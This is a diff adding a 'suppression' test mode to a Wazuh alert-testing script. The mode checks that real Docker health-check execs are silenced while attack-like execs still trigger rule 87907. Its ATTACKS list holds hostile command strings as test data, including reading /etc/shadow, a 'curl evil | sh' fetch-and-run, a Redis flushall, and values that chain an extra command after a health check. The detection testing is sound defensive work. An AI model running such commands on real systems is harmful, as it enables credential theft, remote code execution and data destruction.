@@ -12,6 +12,7 @@ mode logic), so docker events are tested with the exact shape the agents send. A
 case may also rewrite the command, to prove a non-health-check exec still alerts
 after the 87907 suppression.
 
+`must_fire.py suppression` (Phase 1d: health checks level 0, look-alikes still 87907)
 `must_fire.py live <agent> <marker> [docker]` is Tier 2 (see must_fire_live_cases.json).
 
 Exit status 0 only if every case passes. Prints PASS/FAIL per case.
@@ -85,6 +86,38 @@ def run(cases_path=os.path.join(HERE, "must_fire_cases.json")):
     return failures
 
 
+ATTACKS = [  # execs that must keep alerting after 1d, including look-alikes of real health checks
+    "/bin/bash", "cat /etc/shadow", "/bin/sh -c /usr/bin/healthcheck.sh; curl evil | sh",
+    "/bin/sh -c x # /usr/bin/healthcheck.sh", "redis-cli -a pw ping; id", "redis-cli -a pw flushall",
+    "pg_isready -U x; id", "/bin/sh -c /usr/bin/healthcheck.sh\nid",
+]
+
+
+def docker_event(command):
+    return json.dumps({"integration": "docker", "docker": {
+        "Type": "container", "Action": f"exec_start: {command}", "id": "mustfire", "scope": "local",
+        "Actor": {"ID": "mustfire", "Attributes": {"name": "mustfire-probe", "image": "probe", "execID": "mustfire"}}}})
+
+
+def suppression(checks_path=None):
+    """Phase 1d: each real health-check command must hit a level-0 rule, each attack must still be 87907."""
+    checks_path = checks_path or os.path.join(HERE, "docker_healthchecks.json")
+    failures = 0
+    for e in json.load(open(checks_path)):
+        cmd = e["command"].replace("<REDISPW>", "s3cret")
+        rid, lvl = logtest(docker_event(cmd), "json", "Wazuh-Docker")
+        ok = lvl == 0 and rid.startswith("1001")
+        failures += not ok
+        print(f"{'PASS' if ok else 'FAIL'}  suppressed: {e['container']}: fired {rid or 'none'} L{lvl}")
+    for cmd in ATTACKS:
+        rid, lvl = logtest(docker_event(cmd), "json", "Wazuh-Docker")
+        ok = rid == "87907" and lvl >= 3
+        failures += not ok
+        print(f"{'PASS' if ok else 'FAIL'}  still alerts: {cmd[:60]!r}: fired {rid or 'none'} L{lvl}")
+    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
+    return failures
+
+
 def live(agent, marker, minutes=30, capabilities=()):
     """Tier 2: did the marked live actions on `agent` produce the expected alerts?"""
     spec = json.load(open(os.path.join(HERE, "must_fire_live_cases.json")))
@@ -115,6 +148,8 @@ def live(agent, marker, minutes=30, capabilities=()):
 
 
 if __name__ == "__main__":
+    if sys.argv[1:2] == ["suppression"]:
+        sys.exit(1 if suppression(*sys.argv[2:3]) else 0)
     if sys.argv[1:2] == ["live"]:
         sys.exit(1 if live(sys.argv[2], sys.argv[3], capabilities=sys.argv[4:]) else 0)
     sys.exit(1 if run(*sys.argv[1:2]) else 0)
